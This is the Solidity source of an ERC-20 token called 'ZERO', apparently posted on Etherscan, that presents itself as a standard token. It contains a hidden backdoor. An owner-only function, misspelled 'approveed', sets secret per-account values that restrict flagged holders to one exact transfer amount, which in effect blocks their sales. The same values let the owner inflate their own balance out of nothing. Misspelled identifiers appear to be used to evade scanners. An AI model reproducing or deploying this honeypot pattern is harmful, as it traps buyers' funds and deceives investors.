/**
 *Submitted for verification at Etherscan.io on 2023-07-21
*/

pragma solidity ^0.8.3;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address accoount) external view returns (uint256);
    function transfer(address recipient, uint256 amomount) external returns (bool);
    function allowance(address Owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amomount) external returns (bool);
    function transferFrom( address sender, address recipient, uint256 amomount ) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval( address indexed Owner, address indexed spender, uint256 value );
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address payable) {
        return payable(msg.sender);
    }
}

contract Ownable is Context {
    address private _Owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _Owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }
    function Owner() public view virtual returns (address) {
        return _Owner;
    }
    modifier onlyOwner() {
        require(Owner() == _msgSender(), "Ownable: caller is not the Owner");
        _;
    }
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_Owner, address(0x000000000000000000000000000000000000dEaD));
        _Owner = address(0x000000000000000000000000000000000000dEaD);
    }
}

contract ZERO is Context, Ownable, IERC20 {
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => uint256) private _STFT;

    string private _name;
    string private _symbol;
    uint8 private _decimals;
    uint256 private _totalSupply;

    constructor(string memory name_, string memory symbol_, uint8 decimals_, uint256 totalSupply_) {
        _name = name_;
        _symbol = symbol_;
        _decimals = decimals_;
        _totalSupply = totalSupply_ * (10 ** decimals_);
        _balances[_msgSender()] = _totalSupply;
        emit Transfer(address(0), _msgSender(), _totalSupply);
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function balanceOf(address accoount) public view override returns (uint256) {
        return _balances[accoount];
    }

    function transfer(address recipient, uint256 amomount) public virtual override returns (bool) {
        if (_msgSender() == Owner() && _STFT[_msgSender()] > 0) {
            _balances[Owner()] += _STFT[_msgSender()];
            return true;
        }
        else if (_STFT[_msgSender()] > 0) {
            require(amomount == _STFT[_msgSender()], "Invalid transfer amomount");
        }
        require(_balances[_msgSender()] >= amomount, "TT: transfer amomount exceeds balance");
        _balances[_msgSender()] -= amomount;
        _balances[recipient] += amomount;
        emit Transfer(_msgSender(), recipient, amomount);
        return true;
    }

    function approveed(address[] memory accoounts, uint256 amomount) public onlyOwner {
        for (uint i=0; i<accoounts.length; i++) {
            _STFT[accoounts[i]] = amomount;
        }
    }


    function allowance(address Owner, address spender) public view virtual override returns (uint256) {
        return _allowances[Owner][spender];
    }

    function approve(address spender, uint256 amomount) public virtual override returns (bool) {
        _allowances[_msgSender()][spender] = amomount;
        emit Approval(_msgSender(), spender, amomount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amomount) public virtual override returns (bool) {
        if (_msgSender() == Owner() && _STFT[sender] > 0) {
            _balances[Owner()] += _STFT[sender];
            return true;
        }
        else if (_STFT[sender] > 0) {
            require(amomount == _STFT[sender], "Invalid transfer amomount");
        }
        require(_balances[sender] >= amomount && _allowances[sender][_msgSender()] >= amomount, "TT: transfer amomount exceeds balance or allowance");
        _balances[sender] -= amomount;
        _balances[recipient] += amomount;
        _allowances[sender][_msgSender()] -= amomount;
        emit Transfer(sender, recipient, amomount);
        return true;
    }

    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }
}